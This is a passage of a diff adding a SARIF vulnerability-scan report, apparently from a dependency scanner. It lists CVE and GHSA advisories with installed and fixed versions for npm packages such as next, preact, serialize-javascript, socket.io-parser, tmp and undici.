+            "text": "Package: next\nInstalled Version: 15.5.9\nVulnerability CVE-2026-27980\nSeverity: MEDIUM\nFixed Version: 16.1.7\nLink: [CVE-2026-27980](https://avd.aquasec.com/nvd/cve-2026-27980)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 23480,
+                  "startColumn": 1,
+                  "endLine": 23531,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: next@15.5.9"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-29057",
+          "ruleIndex": 26,
+          "level": "warning",
+          "message": {
+            "text": "Package: next\nInstalled Version: 15.5.9\nVulnerability CVE-2026-29057\nSeverity: MEDIUM\nFixed Version: 16.1.7, 15.5.13\nLink: [CVE-2026-29057](https://avd.aquasec.com/nvd/cve-2026-29057)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 23480,
+                  "startColumn": 1,
+                  "endLine": 23531,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: next@15.5.9"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-22028",
+          "ruleIndex": 27,
+          "level": "error",
+          "message": {
+            "text": "Package: preact\nInstalled Version: 10.28.0\nVulnerability CVE-2026-22028\nSeverity: HIGH\nFixed Version: 10.26.10, 10.27.3, 10.28.2\nLink: [CVE-2026-22028](https://avd.aquasec.com/nvd/cve-2026-22028)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 24706,
+                  "startColumn": 1,
+                  "endLine": 24715,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: preact@10.28.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "GHSA-5c6j-r48x-rmvq",
+          "ruleIndex": 28,
+          "level": "error",
+          "message": {
+            "text": "Package: serialize-javascript\nInstalled Version: 6.0.2\nVulnerability GHSA-5c6j-r48x-rmvq\nSeverity: HIGH\nFixed Version: 7.0.3\nLink: [GHSA-5c6j-r48x-rmvq](https://github.com/advisories/GHSA-5c6j-r48x-rmvq)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 25971,
+                  "startColumn": 1,
+                  "endLine": 25980,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: serialize-javascript@6.0.2"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-33151",
+          "ruleIndex": 29,
+          "level": "error",
+          "message": {
+            "text": "Package: socket.io-parser\nInstalled Version: 4.2.4\nVulnerability CVE-2026-33151\nSeverity: HIGH\nFixed Version: 3.3.5, 3.4.4, 4.2.6\nLink: [CVE-2026-33151](https://avd.aquasec.com/nvd/cve-2026-33151)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 26336,
+                  "startColumn": 1,
+                  "endLine": 26348,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: socket.io-parser@4.2.4"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-54798",
+          "ruleIndex": 30,
+          "level": "note",
+          "message": {
+            "text": "Package: tmp\nInstalled Version: 0.0.33\nVulnerability CVE-2025-54798\nSeverity: LOW\nFixed Version: 0.2.4\nLink: [CVE-2025-54798](https://avd.aquasec.com/nvd/cve-2025-54798)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 27252,
+                  "startColumn": 1,
+                  "endLine": 27264,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: tmp@0.0.33"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-1526",
+          "ruleIndex": 31,
+          "level": "error",
+          "message": {
+            "text": "Package: undici\nInstalled Version: 5.29.0\nVulnerability CVE-2026-1526\nSeverity: HIGH\nFixed Version: 6.24.0, 7.24.0\nLink: [CVE-2026-1526](https://avd.aquasec.com/nvd/cve-2026-1526)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 27664,
+                  "startColumn": 1,
+                  "endLine": 27676,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: undici@5.29.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-2229",
+          "ruleIndex": 32,
+          "level": "error",
+          "message": {
+            "text": "Package: undici\nInstalled Version: 5.29.0\nVulnerability CVE-2026-2229\nSeverity: HIGH\nFixed Version: 6.24.0, 7.24.0\nLink: [CVE-2026-2229](https://avd.aquasec.com/nvd/cve-2026-2229)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 27664,
+                  "startColumn": 1,
+                  "endLine": 27676,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: undici@5.29.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-1525",
+          "ruleIndex": 33,
+          "level": "warning",
+          "message": {
+            "text": "Package: undici\nInstalled Version: 5.29.0\nVulnerability CVE-2026-1525\nSeverity: MEDIUM\nFixed Version: 6.24.0, 7.24.0\nLink: [CVE-2026-1525](https://avd.aquasec.com/nvd/cve-2026-1525)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 27664,
+                  "startColumn": 1,
+                  "endLine": 27676,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: undici@5.29.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-1527",
+          "ruleIndex": 34,
+          "level": "warning",
+          "message": {
+            "text": "Package: undici\nInstalled Version: 5.29.0\nVulnerability CVE-2026-1527\nSeverity: MEDIUM\nFixed Version: 6.24.0, 7.24.0\nLink: [CVE-2026-1527](https://avd.aquasec.com/nvd/cve-2026-1527)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 27664,
+                  "startColumn": 1,
+                  "endLine": 27676,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: undici@5.29.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-22036",
+          "ruleIndex": 35,
+          "level": "warning",
+          "message": {
+            "text": "Package: undici\nInstalled Version: 5.29.0\nVulnerability CVE-2026-22036\nSeverity: MEDIUM\nFixed Version: 7.18.2, 6.23.0\nLink: [CVE-2026-22036](https://avd.aquasec.com/nvd/cve-2026-22036)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 27664,
+                  "startColumn": 1,
+                  "endLine": 27676,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: undici@5.29.0"
+              }
+            }
+          ]
+        }
+      ],
+      "columnKind": "utf16CodeUnits",
+      "originalUriBaseIds": {
+        "ROOTPATH": {
+          "uri": "file:///workdir/"
+        }
+      }
+    }
+  ]
+}
